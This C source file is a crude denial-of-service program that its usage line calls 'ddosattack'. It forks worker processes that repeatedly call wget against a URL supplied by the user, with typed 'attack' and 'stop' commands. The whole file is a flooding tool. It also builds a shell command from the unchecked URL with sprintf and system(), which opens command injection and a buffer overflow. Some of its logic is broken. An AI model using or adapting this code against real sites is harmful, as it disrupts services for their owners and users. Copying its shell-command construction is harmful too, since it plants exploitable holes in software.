#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>

int s = 0;
char* url;

void worker(int sig){
	char u[200];
	sprintf(u, "wget -q -O - -o /dev/null %s >/dev/null", url); 
	while(true){
		double x = drand48();
		s = x * s;
		usleep(1000*s);
		system(u);
		printf("%d: sending request\n", sig);
	}
}

void stop(int sig){
	_exit(3);
}

int main(int argc, char **argv){
	if(argc != 4){
		printf("./ddosattack N-procs MaxSleepTime \"url\"\n");
		exit(1);
	}
		
	printf("Enter \"attack\" to begin DOS attack on\n%s\n", argv[3]);
	printf("Enter \"stop\" to stop DOS attack and exit\n");

	s = atoi(argv[2]);

	if(s < 0){
		printf("Enter in a valid MaxSleepTime");
		exit(1);
	}
	url = argv[3];
	int procs = atoi(argv[1]);
	if(procs <= 0) {
		printf("Enter a valid number of processes\n");
		exit(1);
	}
/*
	char attack[8];
	while(scanf("%7s", attack)){
		if(strcmp(attack, "attack") == 0){
			break;
		} else{printf("INVALID REQUEST\n");}
	}
*/
//	int *rv = (int*) malloc(sizeof(int) * procs);

	for(int i = 0; i < procs; i++){
		pid_t retval = fork();
		if(retval == 0){
			signal(SIGUSR1, worker);
			signal(SIGUSR2, stop);
			while(true) pause();
		} else if(retval > 0){			
			char stp[5];
			//rv[i] = retval;
			char attack[8];
			while(scanf("%7s", attack)){
				if(strcmp(attack, "attack") == 0){
					break;
				} else{printf("INVALID REQUEST\n");}
			}
			if(kill(retval, SIGUSR1) < 0) {
				perror("kill error\n");
				exit(1);
			}	
			while(scanf("%4s", stp)){
				if(strcmp(stp, "stop") == 0){
					break;
				}else{printf("INVALID REQUEST\n");}
			}		
			kill(retval, SIGUSR2);
			wait(NULL);
		}

	}
/*
	char stp[5];
	while(scanf("%4s", stp)){
		if(strcmp(stp, "stop") == 0){
			break;
		}else{printf("INVALID REQUEST\n");}
	}
	
	for(int k = 0; k < procs; k++) {
		kill(rv[k], SIGUSR2);
		wait(NULL);
	}
*/
}

